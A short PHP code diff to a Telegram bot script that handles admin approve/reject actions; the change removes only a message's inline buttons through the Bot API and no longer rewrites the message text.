@@ -111,23 +111,16 @@ foreach ($tgData['result'] as $update) {
         $sessData['action'] = $action;
         $sessData['lastUpdateId'] = $lastUpdateId;
 
-        // Editar mensaje en Telegram para quitar botones
+        // Quitar SOLO los botones del mensaje en Telegram (mantener texto original)
         $msgId = $sessData['messageId'] ?? null;
         if ($msgId) {
-            $resultText = $action === 'aprobar'
-                ? "✅ <b>APROBADO</b>\nSolicitud aceptada y procesada."
-                : ($action === 'rechazar'
-                    ? "❌ <b>RECHAZADO</b>\nSolicitud denegada."
-                    : "🔔 <b>ACCIÓN: " . strtoupper($action) . "</b>\nAdministrador solicitó paso adicional.");
-
             $editBody = http_build_query([
-                'chat_id'    => $config['chat_id'],
-                'message_id' => $msgId,
-                'text'       => $resultText,
-                'parse_mode' => 'HTML'
+                'chat_id'      => $config['chat_id'],
+                'message_id'   => $msgId,
+                'reply_markup' => json_encode(['inline_keyboard' => []])
             ]);
 
-            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
+            $ch = curl_init("https://api.telegram.org/bot{$botToken}/editMessageReplyMarkup");
             curl_setopt_array($ch, [
                 CURLOPT_POST           => true,
                 CURLOPT_POSTFIELDS     => $editBody,
